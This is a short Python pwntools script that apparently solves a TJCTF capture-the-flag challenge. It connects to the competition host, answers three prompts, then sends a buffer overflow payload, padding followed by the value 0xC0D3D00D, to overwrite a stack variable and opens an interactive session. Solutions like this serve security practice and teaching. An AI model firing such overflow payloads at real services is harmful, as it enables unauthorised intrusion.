from pwn import *

r = remote("p1.tjctf.org", 8002)

r.sendlineafter(': ', b'a')
r.sendlineafter(': ', b'a')
r.sendlineafter(': ', b'a')

payload = b''
payload += b'a' * (0x80 - 0xC) + p32(0xC0D3D00D)

r.sendlineafter(': ', payload)
r.interactive() 